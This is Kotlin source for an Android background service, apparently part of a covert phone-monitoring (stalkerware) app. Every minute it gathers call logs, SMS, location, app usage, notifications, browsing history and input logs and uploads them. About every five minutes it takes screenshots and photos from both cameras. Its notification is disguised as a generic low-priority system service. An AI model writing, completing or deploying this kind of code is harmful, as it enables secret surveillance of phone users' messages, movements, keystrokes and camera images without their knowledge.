package com.takip.app.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.takip.app.R
import com.takip.app.api.ApiClient
import com.takip.app.collector.AppUsageCollector
import com.takip.app.collector.CallCollector
import com.takip.app.collector.CameraCaptureHelper
import com.takip.app.collector.LocationCollector
import com.takip.app.collector.SmsCollector
import com.takip.app.util.PrefsManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.File

class MonitoringService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var syncJob: Job? = null
    private var mediaCounter = 0

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(NOTIFICATION_ID, createNotification())
        startSyncLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())
        if (syncJob?.isActive != true) startSyncLoop()
        return START_STICKY
    }

    override fun onDestroy() {
        syncJob?.cancel()
        scope.cancel()
        super.onDestroy()
    }

    private fun startSyncLoop() {
        syncJob = scope.launch {
            while (isActive) {
                syncData()
                delay(SYNC_INTERVAL_MS)
            }
        }
    }

    private suspend fun syncData() {
        val token = PrefsManager.deviceToken ?: return

        ApiClient.heartbeat(token)

        val calls = CallCollector.collect(this)
        if (calls.length() > 0) ApiClient.uploadCalls(token, calls)

        val sms = SmsCollector.collect(this)
        if (sms.length() > 0) ApiClient.uploadSms(token, sms)

        val locations = LocationCollector.collect(this)
        if (locations.length() > 0) ApiClient.uploadLocations(token, locations)

        val usage = AppUsageCollector.collect(this)
        if (usage.length() > 0) ApiClient.uploadAppUsage(token, usage)

        val pending = NotificationQueue.drain()
        if (pending.length() > 0) ApiClient.uploadNotifications(token, pending)

        val webHistory = ActivityLogQueue.drainWebHistory()
        if (webHistory.length() > 0) ApiClient.uploadWebHistory(token, webHistory)

        val inputLogs = ActivityLogQueue.drainInputLogs()
        if (inputLogs.length() > 0) ApiClient.uploadInputLogs(token, inputLogs)

        captureAndUploadMedia(token)
    }

    private fun captureAndUploadMedia(token: String) {
        mediaCounter++
        if (mediaCounter % 5 != 0) return // Her ~5 dakikada bir medya

        // Ekran görüntüsü (Accessibility gerekli)
        TakipAccessibilityService.instance?.takeScreenCapture { bytes ->
            if (bytes != null) {
                val file = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
                file.writeBytes(bytes)
                ApiClient.uploadMedia(token, file, "screenshot")
            }
        }

        // Arka kamera
        CameraCaptureHelper.capturePhoto(this, useFrontCamera = false)?.let { file ->
            ApiClient.uploadMedia(token, file, "camera_back")
        }

        // Ön kamera
        CameraCaptureHelper.capturePhoto(this, useFrontCamera = true)?.let { file ->
            ApiClient.uploadMedia(token, file, "camera_front")
        }
    }

    private fun createNotification(): Notification {
        val channelId = "takip_monitoring"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Sistem Servisi",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Arka plan servisi"
                setShowBadge(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.service_notification_title))
            .setContentText(getString(R.string.service_notification_text))
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    companion object {
        private const val NOTIFICATION_ID = 1001
        private const val SYNC_INTERVAL_MS = 60_000L

        fun start(context: Context) {
            val intent = Intent(context, MonitoringService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }
}
